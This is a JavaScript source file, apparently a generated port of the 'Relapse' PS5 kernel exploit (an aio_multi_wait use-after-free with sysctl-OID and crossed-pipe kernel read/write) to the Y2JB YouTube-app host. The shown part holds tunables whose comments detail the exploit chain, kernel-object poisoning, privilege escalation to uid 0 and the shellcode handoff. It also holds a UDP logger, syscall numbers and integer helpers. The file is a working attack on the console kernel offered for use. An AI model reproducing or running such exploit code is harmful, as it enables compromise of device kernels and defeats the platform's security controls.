/*
 * relapse-y2jb - the Relapse PS5 kernel exploit (aio_multi_wait UAF) ported to
 *                the Y2JB (YouTube / V8) userland host.
 *
 * Generated file - do not edit directly. Edit src/relapse.template.js and run
 * `node tools/build.mjs` (see README.md).
 *
 * Upstream kernel stage: Relapse-Exploit/src/relapse_exploit.js (verbatim,
 * with the four edits listed in tools/build.mjs).
 * Upstream kernel offsets: Relapse-Exploit/offsets/*.js (window.KRW blocks,
 * inlined below).
 *
 * Credits:
 *   - Relapse kernel exploit (aio_multi_wait UAF + sysctl-OID r/w window),
 *     browser stage and per-firmware offsets: ntfargo and the Relapse credits
 *     (ufm42, Sonic_Iso, Jordy, Dr. Yenyen, TheFlow, SlidyBat, Flatz, cow,
 *     nhk, bollarz, Sleirsgoevy, EchoStretch, EarthOnion).
 *   - Y2JB userland framework (V8 host, ROP/syscall bridge, kexp + elfldr
 *     delivery): Gezine (https://github.com/Gezine/Y2JB).
 *   - kexp post-jailbreak all-in-one shellcode: ufm42.
 *   - Y2JB host port: this repository.
 *
 * MIT License - see LICENSE.
 */

(async function () {
    try {
        const relapse_version = "relapse-y2jb 1.0";

        // ------------------------------------------------------------------
        // Tunables
        // ------------------------------------------------------------------

        // Thread stack for the ROP worker. thr_new is told about the first
        // WORKER_STACK_PASS bytes; the whole WORKER_STACK_SIZE region is
        // filled with the chain pointer so that wherever the kernel puts the
        // new thread's RSP, `pop rsp` lands on it (see spawn_worker).
        const WORKER_STACK_SIZE = 0x4000n;
        const WORKER_STACK_PASS = 0x2000n;

        // Relapse pins the thread that runs the race to a single core. Here
        // that thread is the chain worker, so it gets pinned too:
        //   "other" - a different allowed core than the main thread (default:
        //             keeps V8 timer wakeups off the racing core)
        //   "same"  - the same core the main thread picked (upstream shape)
        //   null    - leave the worker floating
        const WORKER_CORE = "other";

        // A race chain runs ~3500 syscalls; give it plenty of slack.
        const CHAIN_TIMEOUT_MS = 20000;

        // One run per boot marker (same discipline as the p2jb Y2JB port).
        const FAIL_MARKER_NAME = "relapse.fail";
        // Debug override: run even if a previous attempt left the marker behind
        // (e.g. when /user/temp survived a reboot and you know the kernel is
        // clean). Leave false in normal use.
        const IGNORE_FAIL_MARKER = false;

        // Put eboot's segment descriptors back as soon as the kexp shellcode
        // returns. WIDEN_EBOOT (below) sets segments[0] to addr=0/size=~0 so the
        // blob can resolve its imports; that is kernel state the process-teardown
        // path walks, and it is the one thing upstream Relapse never does.
        //
        // Three hardware runs black-screened the console when YouTube was closed:
        // pipes armed, pipes sealed (master NULL), and finally both pipe buffers
        // NULL and verified with nothing else loaded. So the pipes are not it,
        // and neither is the payload - this widened segment descriptor is the
        // surviving difference between "closing the browser is fine" and
        // "closing YouTube kills the console".
        const RESTORE_EBOOT_AFTER_HANDOFF = true;

        // Refuse to run when the p2jb Y2JB port already ran this boot but this
        // process is not jailbroken (YouTube relaunched, or p2jb died part-way
        // through). p2jb's cr_ref triple-free is a point of no return: the
        // kernel heap already holds its stale, ref-pinned ucreds, and racing an
        // aio UAF plus a slab-churn spray on top of that is how you turn a
        // recoverable state into a kernel panic. Set to true only if you know
        // why you want it.
        const ALLOW_AFTER_P2JB = false;

        // Teardown after the handoff is upstream's rescue(), unchanged and in
        // upstream's order: restoreOids -> restorePipes -> releaseAioWorkers ->
        // closeScratchDescriptors.
        //
        // An earlier revision reordered that (disarm both pipes, then the OIDs)
        // and it silently no-op'd the OID restore: restoreOids() writes through
        // the crossed pipes, and disarmPipes() is what destroys them. Both
        // primitives are single-use - restoring the OIDs kills the sysctl window,
        // disarming the master kills the pipe path, and the pipe path's aimVictim
        // re-arms the victim as a side effect - so "both buffers NULL *and* a
        // clean sysctl tree" is not reachable in any order. Upstream's ordering
        // is the one that is known to work, so that is what runs by default;
        // disarmPipes() stays reachable through tools/seal.js for the case where
        // the OIDs have not been restored yet.

        // Prepare the kernel state the way Y2JB's own jailbreaks do before
        // handing over to ufm42's shellcode:
        //   * widen the eboot segment so dlsym() is unrestricted. Y2JB's kexp
        //     blob resolves its own imports (aioshellcode.js patches nothing,
        //     unlike Relapse's kexp.js which writes libkernel/libc addresses
        //     into the blob), and both lapse.js and the p2jb port do this
        //     ("Allow dlsym") - Relapse's escalate() does not.
        //   * fhold() the four pipe files so nothing can free them underneath
        //     the shellcode (lapse.js does this too).
        const PREPARE_FOR_KEXP = true;
        // Split so the two can be A/B'd: the hardware run that succeeded had
        // both, the one that panicked at handoff 5/6 had neither (they were
        // skipped by a bug). The dlsym probe showed the blob does NOT use the
        // dlsym syscall, so WIDEN_EBOOT is probably not what makes the shellcode
        // survive - but it is what the kernel walks when the host app is closed,
        // hence RESTORE_EBOOT_AFTER_HANDOFF above.
        const WIDEN_EBOOT = true;
        // Proven fatal: Build W died 4 s after exit with this on, Build X lived
        // without it. Diagnostic builds only; production rejects --set on it.
        const FHOLD_PIPES = false;

        // Forensics. Three hardware runs black-screened the console when
        // YouTube was closed, and the obvious suspects are gone: both pipe
        // buffers NULL and verified (still crashed), nothing loaded but the
        // jailbreak (still crashed), sysctl OIDs restored in upstream's order
        // (still crashed), eboot's segment descriptors written back and verified
        // (still crashed). What is left that the browser flow does not do is the
        // kernel payload itself - this port hands over to Y2JB's
        // kexp_2026_05_25.bin + elfldr, while upstream Relapse runs its own
        // shellcode - so "closing the browser is fine" says nothing about it.
        //
        // DIAGNOSE_AFTER_HANDOFF snapshots the process's kernel-visible state
        // (p_ucred and its fields, every f_cred, every td_ucred, the filedesc,
        // the dynlib syscall range, both pipe buffers) immediately before and
        // after the handoff. The diff is exactly what the blob changed, and it
        // goes out over UDP so it survives the panic.
        //
        // STABILIZE_CREDS then applies the p2jb port's close-panic fix: migrate
        // every f_cred and td_ucred that is not the process cred onto the
        // process cred and pay for it in cr_ref, so teardown refcounts balance.
        // It reports how much it had to do - if that is zero, creds are
        // exonerated and the dump tells us where to look next.
        // Bisect switch: run everything except the handoff to the kexp blob, so
        // the console ends up with a Relapse-only jailbreak (escalate() has
        // already given the process uid 0 and full sceCaps) and no elfldr. If
        // closing YouTube survives that, the panic is in the blob/elfldr or in
        // the kexp preparation; if it still dies, it is in the exploit's own
        // residue and the browser flow's close-safety is about the host, not the
        // payload. Pair with PREPARE_FOR_KEXP=false for a run that does nothing
        // upstream Relapse does not do.
        const SKIP_HANDOFF = false;

        // Bisect ladder for the close-the-host-app panic. Stops the run at a
        // stage boundary; rescue() still runs, so the sysctl OIDs, the pipes and
        // the armed aio groups are all put back on the way out.
        //   "chain"    - the worker chain self-test only. The exploit never runs
        //                and no kernel state is touched at all, so this isolates
        //                the thr_new/ROP machinery this port adds.
        //   "arm"      - + the sysctl-OID hijack and the aio race (slow r/w)
        //   "fast"     - + the crossed pipes (fast r/w)
        //   "defuse"   - + the aio group repair, before any privilege change
        //   "escalate" - + uid 0 / sceCaps / root fs, no handoff
        //   null       - everything (SKIP_HANDOFF then decides about the blob)
        const STOP_AFTER = null;

        // Close the four crossed-pipe fds ourselves at the end of the run
        // instead of leaving them to the process teardown. restorePipes() can
        // only ever disarm one of the two pipes, so at exit the other still has
        // a buffer pointer aimed at a pipe struct and pipe teardown calls
        // vm_map_remove() on it. Doing the close here makes that immediate and
        // observable: if the console dies right after the "closing" line then
        // freeing an armed pipe buffer is fatal, and if it survives the pipes
        // are out of the exit path entirely.
        const CLOSE_PIPES_AFTER_RUN = false;

        // The aio machinery is the last thing every dying run has in common.
        // Run B (chain self-test only) survived closing YouTube; Run C added the
        // aio race and the crossed pipes and died; Run D2 was Run C with all
        // four pipe fds closed by the payload - every close() returned 0 and the
        // console still lived through it, then died the moment YouTube was
        // closed. So freeing an armed pipe buffer is harmless and the pipes are
        // out; what is left is the aio state the race leaves reachable from
        // p_aioinfo, which the kernel walks when the process exits.
        //
        // AIO_DUMP_AFTER_RELEASE dumps that state after rescue() has defused the
        // armed groups and woken the parked workers: the aioinfo header, the
        // id-table page count, and every armed-group and parked-job slot with
        // its type/state/generation/object, plus each group's num/state/waiters.
        //
        // AIO_LEAK_ON_EXIT then sets p_aioinfo to NULL, so the exit path has
        // nothing to walk and the structures leak instead of being freed -
        // whatever the race left reachable from them stays valid, and a worker
        // that wakes later still finds real memory. p_aioinfo is NULL for every
        // process that never used aio, so NULL has to be handled already.
        //
        // Both need the crossed pipes, so rescue() now releases the workers
        // before it restores the pipes (upstream did it the other way round;
        // releaseAioWorkers() only closes two fds, so nothing else changes).
        // Read-only dump of the reclaimed aio waiter arrays, taken inside
        // defuseAioGroups() while the group still points at them.
        // buildWaiterNodes() fills them with firstTarget / secondTarget /
        // &nodeMutex; the dump is logged next to kbase and the nodeMutex address
        // the table implies so the fake fields can be recognised.
        const AIO_DUMP_WAITERS = false;
        const AIO_DUMP_AFTER_RELEASE = false;
        // DO NOT ENABLE. Hardware, Build D: writing NULL to p_aioinfo with the
        // parked workers already released panics the console within seconds, on
        // its own, with the payload finished and the host app still open. The
        // write itself succeeds and reads back as NULL; something in the aio
        // machinery dereferences it afterwards.
        const AIO_LEAK_ON_EXIT = false;

        // Build A of the close-panic hunt. Enumerate every kernel object the
        // race poisoned *while the aio id table is still alive*, remember its
        // bytes, then re-read them at teardown. Read-only - it cannot make a
        // run worse. It answers two questions the bisect could not: how many
        // objects are carrying buildWaiterNodes()'s signature (firstTarget /
        // secondTarget / &nodeMutex at +0x00/+0x08/+0x10, 0xffffffff at +0x20),
        // and whether anything else has moved into them by the time rescue()
        // runs. If the signature is gone at teardown, the slab really was
        // recycled and the scrub in Build B has a target; if it is still there,
        // the poison is being reached some other way.
        const AIO_POISON_SNAPSHOT = false;
        // Caps for pass 1. Build A1 walked all 2550 ids the race produces and
        // dereferenced the object field of every slot, including the dead ones:
        // a freed slot still holds a stale kernel pointer there, it passes the
        // "looks like a kernel address" check, and reading through it faulted
        // the console. Slots are now validated before they are followed, and
        // both caps keep a diagnostic build from being the thing that crashes.
        const POISON_ID_MAX = 512;        // ids examined (5 pipe reads each)
        const POISON_SNAPSHOT_MAX = 32;   // objects dumped (5 reads each)
        // Waiter arrays are enumerated completely rather than sampled: they are
        // the only structures the scrub touches, and leaving one behind would
        // make the result unreadable.
        const POISON_WAITER_MAX = 64;

        // Build B: zero the fake waiter nodes where they sit, before the parked
        // workers are woken. Build A found them: still allocated, still
        // byte-identical at teardown, still holding firstTarget/secondTarget
        // (sysctl-OID memory) at +0x00/+0x08 and a real kernel mutex at +0x10.
        // defuseAioGroups() unlinks the array but leaves those bytes in it, so
        // anything that walks a node when the host process exits dereferences
        // OID memory and locks a mutex it does not own. Zero is the value the
        // kernel itself writes into a list head to mean "empty", so it is the
        // neutral thing to leave behind. Only nodes whose +0x10 still equals
        // nodeMutex are touched - if the slab has been reused, the scrub stops
        // rather than zeroing somebody else's object.
        // Needs AIO_POISON_SNAPSHOT: the addresses come from its recording.
        const AIO_POISON_SCRUB = false;

        // Build E: cancel every aio id the race left behind - the armed groups
        // and the parked jobs - through the real syscall, then re-dump the id
        // table to show which slots actually went free. The hypothesis is that
        // the exit path frees objects the race already freed, and cancelling
        // them here means there is nothing left for it to double-free. Unlike
        // AIO_LEAK_ON_EXIT this goes through the kernel's own teardown rather
        // than detaching a structure out from under live workers, which is what
        // made the leak take the console down within seconds of the write, with
        // the payload already finished and YouTube still open.
        const AIO_CANCEL_ALL = false;

        // Exit-path probe. Every hardware run so far has ended the same way:
        // the payload finishes, the host app is closed through the UI, and the
        // console dies. That is the graceful close path - SceAppMgr suspending
        // the app and then tearing it down - and it is not the only way out.
        // Setting this makes the payload end its own process instead, once
        // teardown and the seal hook are done:
        //   "sigkill" - kill(getpid(), SIGKILL). This is exactly what the
        //               unified autoloader does to the host app, and what p2jb
        //               survives with its cr_ref pin, so if the console lives
        //               through it the panic is specific to the graceful path
        //               and the autoloader fork works as it stands.
        //   "exit"    - exit(0), the libc-style return path.
        //   null      - leave it to the user, as normal.
        // If the console survives, the jailbreak and elfldr are still there and
        // the session is usable - nothing is lost by trying.
        const EXIT_TEST = null;

        // Leave the parked aio workers parked. releaseAioWorkers() only closes
        // two fds to wake them, but a woken worker walking state the race left
        // inconsistent is a candidate for the exit-path panic, and skipping it
        // costs nothing: the workers stay blocked and the process exits with
        // them still parked.
        const SKIP_RELEASE_WORKERS = false;

        // Build I: tear down so that nothing is left behind, in the only order
        // the primitives allow. disarmPipes() puts *both* pipe buffers back to
        // NULL and zeroes the eight head fields, which needs the slow sysctl-OID
        // window for the master's side; defuseAioGroups() needs that window too;
        // and restoring the OIDs is what closes it. So the groups stay armed
        // through escalation and the kexp handoff, and the order becomes pipes,
        // groups, OIDs. Upstream defuses inside run() and restores the OIDs
        // through the pipes, which is why restorePipes() can only disarm one
        // side: it NULLs the master's buffer and leaves the victim's aimed at
        // the master's struct. Build H proved that residue alone is fatal -
        // race, cross, tear down, no escalation and no kexp, and closing the
        // host app still panicked.
        // Safe after the handoff because kexp's thread has returned and socksrv
        // runs on kexp's own pipe2, so nothing still needs our pipes.
        // Shipped configuration: the payload makes closing the host app safe by
        // itself, with no ELF and no operator step. It costs the sysctl OIDs, see
        // SKIP_OID_RESTORE.
        const CLEAN_TEARDOWN = true;
        // Save both pipes' real buffer addresses before crossPipes() overwrites
        // them, and write them back at teardown instead of NULLs. Needs
        // SKIP_OID_RESTORE: the restore goes through the slow window, which only
        // works while the OIDs are still hijacked.
        const RESTORE_REAL_BUFFERS = true;
        // Option B, no longer the default: leave the pair crossed and have
        // pipeclean.elf write the real buffers back before closing. It buys stock
        // sysctl OIDs at the cost of a command the operator can forget, and
        // forgetting it panics the console. It was kept because uncrossing the
        // pipes was believed to cost elfldr its kernel r/w; that belief was wrong -
        // kexp runs on its own pipe2, and ftpsrv bound its port and answered after
        // a run that tore the pipes down from JS. Mutually exclusive with
        // RESTORE_REAL_BUFFERS, which restores from JS and therefore has to happen
        // while the slow window is alive.
        const LEAVE_PIPES_ARMED = false;

        // Dump both pipe structs against a freshly created pipe and report every
        // qword that differs. For finding residue in fields the offset table
        // does not name - pipe_state, buffer accounting - after CLEAN_TEARDOWN
        // has run. Off by default: it creates an extra pipe and reads 0x300
        // bytes of kernel memory.
        const PIPE_STRUCT_DIFF = false;

        // Leaves a note for tools/pipeclean/pipeclean.c: the two pipe struct
        // addresses and this firmware's offsets, so the ELF hardcodes no struct
        // layout. Off now that the payload seals itself, and unreachable under
        // CLEAN_TEARDOWN in any case - rescue() returns from cleanTeardown()
        // before the note would be written.
        //
        // Build K, originally: leave a note for tools/pipeclean/pipeclean.c. Upstream's
        // restorePipes() can only disarm one of the two crossed pipes - the
        // write that clears the master's buffer is the last one available, and
        // the victim is left aimed at the master's struct. The slow OID window
        // is the only other primitive and restoring the OIDs closes it, so no
        // order lets the payload clear both (Build I proved the other order
        // dies on the self-referential OID restore). pipeclean.elf runs later,
        // through elfldr, with kernel r/w of its own, and makes that last write.
        // The note carries the two pipe struct addresses and the offsets from
        // this firmware's table, so the ELF hardcodes no struct layout.
        const PIPE_NOTE_FOR_CLEANER = false;

        // Leave the sysctl OIDs hijacked. Shipped, and not as a shortcut: it is
        // forced. Once both pipes hold their real buffers the fast path is dead,
        // and the slow window cannot restore its own enablers - aiming goes through
        // mibA, which needs a.arg1 hijacked and a.kind writable, and landing goes
        // through mibB, which needs b.kind writable and b visible (measured: a
        // hidden b returns rv -1 for read and write alike). Build J tried anyway
        // and died mid-write.
        //
        // The cost is that kern.smp.cpus returns the low half of a kernel address
        // instead of the CPU count until the next reboot. Nothing in the payload
        // chain cared - pldmgr, kstuff, ftpsrv and the browser launch all worked -
        // but software that sizes thread pools by CPU count is untested against it.
        // Restoring a.arg1 last instead would keep cpus correct and move the
        // residue onto nodes the stock kernel does not expose; that needs the c
        // self-reference solved first, since kwrite64 writes its high half through
        // c and so restoring c.arg1 destroys the writer mid-write.
        //
        // Build M, originally: leave the sysctl OIDs hijacked. Diagnostic only.
        //
        // Build G (STOP_AFTER=arm) survived closing the host app, and every run
        // since has treated that as proof the pipe crossing is the trigger. It is
        // not clean proof: restoreOids() begins with "if (!this.crossed) return",
        // so G never restored the OIDs either. G differed from H in two ways, not
        // one - no pipes, and OIDs left hijacked.
        //
        // This separates them. STOP_AFTER=fast with the OIDs left alone keeps the
        // pipe crossing and drops the other variable. If it survives, the pipes
        // are exonerated too and restoreOids() is what leaves the fatal residue -
        // which would also explain why NULLing both pipe buffers changed nothing.
        // If it panics, the pipes are confirmed and the residue is somewhere
        // outside the two structs, since pipeclean proved the structs themselves
        // can be made to look unused.
        const SKIP_OID_RESTORE = true;

        // Build N: fhold the four pipe files in the rescue path, not just in the
        // handoff. With f_count held above zero the exit path drops each fd to 1
        // and never reaches pipe_dtor(), so the pipes are not torn down at all.
        //
        // Production runs already hold them ("handoff 0b: fhold on 4/4") and still
        // panic, so their cause cannot be pipe teardown. Build H had no hold, and
        // restorePipes() leaves the victim armed with buffer = the master's struct
        // and size 16384 - kmem_free() handed another pipe's struct, which faults.
        // Survives -> H's cause was the teardown, and the production panic is a
        // separate bug to chase. Panics -> the crossing corrupts something the
        // exit path walks regardless of the pipes.
        const FHOLD_AT_RESCUE = false;

        // Build A: on the boot *after* a panic, look for anything the console's
        // own crash reporter wrote to disk. If Sony's panic path leaves a dump
        // behind, the panic string is free and the kernel trap hook (Build C)
        // is unnecessary. Runs before the exploit starts, so it reports even if
        // this run then fails. Read-only.
        const CRASH_ARTIFACT_SCAN = false;

        const DIAGNOSE_AFTER_HANDOFF = false;
        const STABILIZE_CREDS = false;

        // Diagnostics for the handoff. PROBE_DLSYM resolves one libkernel
        // symbol through the framework's dlsym() right after the eboot patch,
        // so a broken resolver shows up *before* the shellcode is spawned
        // instead of as a dead console. REPORT_KEXP_SIGNATURE compares the blob
        // against the layout Relapse's kexp.js expects (same 18912 bytes) and
        // tells us whether host-side import patching is possible as a fallback.
        const PROBE_DLSYM = false;
        const REPORT_KEXP_SIGNATURE = true;

        // Network logging. Y2JB's own NETWORK_LOGGING POSTs from inside log(),
        // i.e. behind the DOM/requestAnimationFrame await that loses lines when
        // the console dies, and it needs setlogserver.js sent first with a
        // hardcoded address. This instead sends every line with a blocking
        // sendto() the moment it is produced, to the machine that sent us the
        // payload - discovered with getpeername() on the loader socket, so
        // there is nothing to configure:
        //     python tools/log_listener.py            # on the PC, port 5050
        //   "auto" -> peer of the payload_sender connection (or off if unknown)
        //   "off"  -> disabled
        //   "1.2.3.4" -> explicit address
        const NET_LOG = "auto";
        const NET_LOG_PORT = 5050;

        const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

        // Y2JB's log() appends to the DOM, awaits requestAnimationFrame, maybe
        // awaits a fetch to the log server, and only *then* writes to the
        // payload_sender socket. When the console dies, everything queued behind
        // a rAF is lost - which is why two crashes both "happened" at an earlier
        // line than the real fault. So we take the socket over: log_now() writes
        // the line with a blocking write(2) and leaves log() to do the
        // on-screen part only. Last line received == last step completed.
        let sync_log_buf = 0n;
        let socket_log_fd = null;

        function capture_log_socket() {
            try {
                if (typeof _log_socket_fd !== "undefined" && _log_socket_fd !== null) {
                    socket_log_fd = _log_socket_fd;
                    _log_socket_fd = null;      // stop log() from duplicating it
                }
            } catch (_) { }
        }

        function restore_log_socket() {
            try {
                if (socket_log_fd !== null && typeof _log_socket_fd !== "undefined")
                    _log_socket_fd = socket_log_fd;
            } catch (_) { }
            socket_log_fd = null;
        }

        let net_log_fd = 0n;          // 0n = disabled
        let net_log_sa = 0n;
        let net_log_target = "";
        let net_log_failures = 0;
        let net_log_error = "";
        let net_log_reason = "";

        function drain(num, fd, n, to) {
            let sent = 0;
            while (sent < n) {
                const w = to
                    ? syscall(num, fd, sync_log_buf + BigInt(sent), BigInt(n - sent),
                        0n, net_log_sa, 16n)
                    : syscall(num, fd, sync_log_buf + BigInt(sent), BigInt(n - sent));
                const k = Number(w);
                if (!(k > 0)) { net_log_failures++; return false; }
                sent += k;
            }
            net_log_failures = 0;
            return true;
        }

        function net_log_init() {
            try {
                if (NET_LOG === "off") return false;
                let ip;
                if (NET_LOG === "auto") {
                    // Each of these used to return a bare false, and the caller
                    // reported every one of them as "no payload_sender peer
                    // address". A 7.61 operator's log said exactly that and then
                    // the console panicked with no UDP stream, so the transcript
                    // was TCP-only - lossy and out of order - and the report could
                    // not be answered. Which of these five it was is the whole
                    // question, so each one says so.
                    if (socket_log_fd === null) {
                        net_log_reason = "the loader's log socket was not in scope, " +
                            "so there is no peer to ask";
                        return false;
                    }
                    const sa = hmalloc(16);
                    const len = hmalloc(8);
                    write64(sa, 0n); write64(sa + 8n, 0n); write64(len, 16n);
                    if (syscall(SYSCALL.getpeername, socket_log_fd, sa, len) === MASK64) {
                        net_log_reason = "getpeername() on the loader socket failed";
                        return false;
                    }
                    ip = [Number(read8(sa + 4n) & 0xffn), Number(read8(sa + 5n) & 0xffn),
                        Number(read8(sa + 6n) & 0xffn), Number(read8(sa + 7n) & 0xffn)];
                    if (ip[0] === 127) {
                        net_log_reason = "the payload came from the console itself " +
                            "(peer is loopback), so there is nowhere to mirror to - " +
                            "send it from the PC, or set NET_LOG to an address";
                        return false;
                    }
                    if (ip[0] === 0) {
                        net_log_reason = "the loader socket's peer address is 0.0.0.0";
                        return false;
                    }
                } else {
                    ip = String(NET_LOG).split(".").map(Number);
                    if (ip.length !== 4 || ip.some((o) => !(o >= 0 && o <= 255))) {
                        net_log_reason = "NET_LOG is not \"off\", \"auto\" or a dotted " +
                            "address: " + NET_LOG;
                        return false;
                    }
                }

                // NB: the ported stage declares `const AF_INET = 2` (a number)
                // in this scope, shadowing the framework's BigInt AF_INET, and
                // Y2JB's syscall() stores arguments into a BigUint64Array - so
                // literals, not the global names.
                const fd = syscall(SYSCALL.socket, 2n /* AF_INET */,
                    2n /* SOCK_DGRAM */, 0n);
                if (fd === MASK64) {
                    net_log_reason = "socket(SOCK_DGRAM) failed";
                    return false;
                }
                const sa = hmalloc(16);
                for (let i = 0n; i < 16n; i += 1n) write8(sa + i, 0n);
                write8(sa + 1n, 2n /* AF_INET */);
                write16(sa + 2n, BigInt(((NET_LOG_PORT & 0xff) << 8) |
                    ((NET_LOG_PORT >> 8) & 0xff)));
                write32(sa + 4n, BigInt((ip[0] | (ip[1] << 8) | (ip[2] << 16) |
                    (ip[3] << 24)) >>> 0));
                net_log_fd = fd;
                net_log_sa = sa;
                net_log_target = ip.join(".") + ":" + NET_LOG_PORT + "/udp";
                return true;
            } catch (e) {
                net_log_error = (e && e.message) || String(e);
                net_log_fd = 0n;
                return false;
            }
        }

        // Every line carries a sequence number. The loader's TCP transcript
        // reorders and drops lines when the console dies - one external report had
        // "kexp shellcode returned" before "handoff 5/6: Thrd_create", impossible
        // in program order - and without a number there is no way to tell a lost
        // line from a late one. With it, the last number received is the last step
        // completed, and any gap names the step that died.
        let log_seq = 0;

        function log_now(msg) {
            log_seq++;
            const seq = (log_seq < 10 ? "00" : log_seq < 100 ? "0" : "") + log_seq;
            const text = "[relapse " + seq + "] " + msg;
            try {
                const pr = log(text);           // on-screen (async, may lag)
                if (pr && typeof pr.catch === "function") pr.catch(() => { });
            } catch (_) { }

            const toSocket = socket_log_fd !== null;
            const toNet = net_log_fd !== 0n && net_log_failures < 8;
            if (!toSocket && !toNet) return;
            try {
                const line = text + "\n";
                if (sync_log_buf === 0n) sync_log_buf = hmalloc(0x1000);
                const n = Math.min(line.length, 0xff0);
                for (let i = 0; i < n; i++)
                    write8(sync_log_buf + BigInt(i), BigInt(line.charCodeAt(i) & 0xff));
                if (toSocket) drain(SYSCALL.write, socket_log_fd, n, false);
                if (toNet) drain(SYSCALL.sendto, net_log_fd, n, true);
            } catch (_) { }
        }

        function say(msg) { log_now(msg); }

        async function asay(msg) { log_now(msg); }

        function fatal(msg) {
            say("FATAL: " + msg);
            try { send_notification("relapse: FATAL\n" + msg); } catch (_) { }
            throw new Error("relapse: " + msg);
        }

        // ------------------------------------------------------------------
        // Host sanity - everything below assumes the Y2JB framework globals.
        // Note: Y2JB declares these with top-level `let`/`function` in
        // global.js/main.js, so they live in the global *lexical* scope and
        // are NOT properties of globalThis - they have to be probed with
        // typeof, by name.
        // ------------------------------------------------------------------
        {
            const missing = [];
            const need_fn = {
                syscall: typeof syscall, call: typeof call, malloc: typeof malloc,
                read8: typeof read8, read16: typeof read16, read32: typeof read32,
                read64: typeof read64, write8: typeof write8, write16: typeof write16,
                write32: typeof write32, write64: typeof write64, log: typeof log,
                send_notification: typeof send_notification,
                file_exists: typeof file_exists, write_file: typeof write_file,
                get_nidpath: typeof get_nidpath, alloc_string: typeof alloc_string,
            };
            const need_val = {
                ROP: typeof ROP, SYSCALL: typeof SYSCALL, libc_base: typeof libc_base,
                syscall_wrapper: typeof syscall_wrapper, FW_VERSION: typeof FW_VERSION,
            };
            for (const k in need_fn)
                if (need_fn[k] !== "function") missing.push(k + "() [" + need_fn[k] + "]");
            for (const k in need_val)
                if (need_val[k] === "undefined") missing.push(k);
            if (missing.length)
                fatal("Y2JB helpers missing: " + missing.join(", ") +
                    " (update Y2JB and retry)");

            const need_gadgets = ["ret", "pop_rax", "pop_rdi", "pop_rsi",
                "pop_rdx", "pop_rcx", "pop_r8", "pop_r9", "mov_qword_rdi_rax"];
            const no_gadget = need_gadgets.filter((g) => !ROP[g]);
            if (no_gadget.length)
                fatal("ROP gadget table is missing: " + no_gadget.join(", "));
        }

        // ------------------------------------------------------------------
        // Syscall numbers the framework does not pre-declare
        // ------------------------------------------------------------------
        const SYSCALL_EXTRA = {
            getrlimit: 0xC2n,
            setrlimit: 0xC3n,
            socketpair: 0x87n,
            pipe2: 0x2AFn,
            aio_multi_wait: 0x297n,
            aio_multi_poll: 0x298n,
            aio_multi_cancel: 0x29An,
            aio_submit_cmd: 0x29Dn,
            getpeername: 0x1Fn,
        };
        for (const k in SYSCALL_EXTRA)
            if (!(k in SYSCALL)) SYSCALL[k] = SYSCALL_EXTRA[k];

        const SYS_GETPID = SYSCALL.getpid;
        const SYS_GETUID = SYSCALL.getuid;
        const SYS_READ = SYSCALL.read;
        const SYS_WRITE = SYSCALL.write;
        const SYS_CLOSE = SYSCALL.close;
        const SYS_IOCTL = SYSCALL.ioctl;
        const SYS_SOCKET = SYSCALL.socket;
        const SYS_SETSOCKOPT = SYSCALL.setsockopt;
        const SYS_RECVFROM = SYSCALL.recvfrom;
        const SYS_SOCKETPAIR = SYSCALL.socketpair;
        const SYS_PIPE2 = SYSCALL.pipe2;
        const SYS_NETGETIFLIST = SYSCALL.netgetiflist;
        const SYS___SYSCTL = SYSCALL.sysctl;
        const SYS_GETRLIMIT = SYSCALL.getrlimit;
        const SYS_SETRLIMIT = SYSCALL.setrlimit;
        const SYS_CPUSET_GETAFFINITY = SYSCALL.cpuset_getaffinity;
        const SYS_CPUSET_SETAFFINITY = SYSCALL.cpuset_setaffinity;
        const SYS_RTPRIO_THREAD = SYSCALL.rtprio_thread;
        const SYS_IS_IN_SANDBOX = SYSCALL.is_in_sandbox;
        const SYS_AIO_SUBMIT_CMD = SYSCALL.aio_submit_cmd;
        const SYS_AIO_MULTI_WAIT = SYSCALL.aio_multi_wait;
        const SYS_AIO_MULTI_POLL = SYSCALL.aio_multi_poll;
        const SYS_AIO_MULTI_CANCEL = SYSCALL.aio_multi_cancel;
        const SYS_FCNTL = SYSCALL.fcntl;

        // fcntl(F_SETFL, O_NONBLOCK) for the kexp handoff. These shadow the
        // framework's BigInt globals so the ported stage can keep passing
        // plain numbers.
        const F_SETFL = 4, O_NONBLOCK = 4;

        // ------------------------------------------------------------------
        // int64 - Relapse-Exploit/src/utils/int64.js (backing slices dropped:
        // the Y2JB host addresses memory by BigInt, not by typed-array view)
        // ------------------------------------------------------------------
        function int64(low = 0, hi = 0) {
            this.low = low >>> 0;
            this.hi = hi >>> 0;
            this.backing = null;
        }

        int64.prototype.add32 = function (value) {
            const low = (this.low + value) >>> 0;
            const hi = (this.hi + (low < this.low ? 1 : 0)) >>> 0;
            return new int64(low, hi);
        };

        int64.prototype.add32inplace = function (value) {
            const low = (this.low + value) >>> 0;
            this.hi = (this.hi + (low < this.low ? 1 : 0)) >>> 0;
            this.low = low;
        };

        int64.prototype.sub32inplace = function (value) {
            const low = (this.low - value) >>> 0;
            this.hi = (this.hi - (low > this.low ? 1 : 0)) >>> 0;
            this.low = low;
        };

        int64.prototype.toString = function (radix = 16) {
            const low = this.low.toString(radix);
            if (this.hi === 0) return low;
            const width = radix === 16 ? 8 : Math.ceil(32 / Math.log2(radix));
            return this.hi.toString(radix) + low.padStart(width, "0");
        };

        // ------------------------------------------------------------------
        // value / address marshalling between the ported code and the host
        // ------------------------------------------------------------------
        const MASK32 = 0xffffffffn;
        const MASK64 = 0xffffffffffffffffn;

        // int64 | number | bigint -> BigInt (numbers follow rop.js semantics:
        // they are 32-bit quantities, zero-extended)
        function big(v) {
            if (typeof v === "bigint") return v & MASK64;
            if (v instanceof int64)
                return ((BigInt(v.hi >>> 0) << 32n) | BigInt(v.low >>> 0)) & MASK64;
            if (typeof v === "number") {
                if (!Number.isInteger(v)) throw new TypeError("bad number " + v);
                return BigInt(v >>> 0);
            }
            throw new TypeError("cannot marshal " + typeof v + " " + String(v));
        }

        // BigInt -> int64
        function fromBig(x) {
            const v = BigInt(x) & MASK64;
            return new int64(Number(v & MASK32), Number((v >> 32n) & MASK32));
        }

        // int64 | number | bigint -> [low, hi] (mem.js asWords semantics)
        function words(v) {
            if (v instanceof int64) return [BigInt(v.low >>> 0), BigInt(v.hi >>> 0)];
            if (typeof v === "bigint") {
                const x = v & MASK64;
                return [x & MASK32, (x >> 32n) & MASK32];
            }
            if (typeof v === "number")
                return v < 0 ? [BigInt(v >>> 0), MASK32] : [BigInt(v >>> 0), 0n];
            throw new TypeError("cannot marshal value " + String(v));
        }

